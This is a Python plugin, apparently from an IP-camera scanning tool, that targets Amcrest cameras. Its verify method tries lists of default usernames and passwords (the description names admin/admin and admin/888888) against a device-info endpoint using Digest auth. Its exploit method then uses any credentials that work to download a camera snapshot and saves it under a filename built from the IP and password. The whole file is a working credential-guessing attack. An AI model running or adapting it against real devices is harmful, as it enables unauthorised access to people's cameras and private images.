import requests
from requests.auth import HTTPDigestAuth

from loguru import logger

from .base import POCTemplate


class AmcrestWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['amcrest']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """Amcrest cameras use Dahua-based firmware with common defaults (admin/admin, admin/888888)"""

    def verify(self, ip, port=80):
        """Amcrest uses Dahua RPC2 login and HTTP Digest Auth"""
        headers = {
            'User-Agent': self.config.user_agent,
            'Connection': 'close',
        }
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    # Try HTTP Digest Auth against device info endpoint
                    r = requests.get(
                        f"http://{ip}:{port}/cgi-bin/magicBox.cgi?action=getDeviceType",
                        auth=HTTPDigestAuth(user, password),
                        headers=headers,
                        verify=False,
                        timeout=self.config.timeout
                    )
                    if r.status_code == 200 and 'type=' in r.text:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
        return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))


POCTemplate.register_poc(AmcrestWeakPassword)
